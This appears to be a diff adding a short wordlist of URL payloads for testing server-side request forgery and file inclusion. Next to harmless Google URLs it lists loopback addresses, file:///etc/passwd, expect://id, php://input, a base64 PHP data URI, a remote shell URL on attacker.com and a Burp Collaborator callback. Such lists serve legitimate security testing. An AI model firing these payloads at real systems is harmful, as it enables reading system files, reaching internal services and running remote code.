@@ -1,0 +1,12 @@
+http://www.google.com
+http://www.google.com/search
+https://www.google.com
+http://127.0.0.1/
+http://0.0.0.0/
+file:///etc/passwd
+expect://id
+php://input
+data://text/plain;base64,PD9waHAgZWNobyAic3lzdGVtX2NoZWNrIjsgPz4=
+ftp://attacker.com/shell.php
+http://[::1]/
+http://burpcollaborator.net
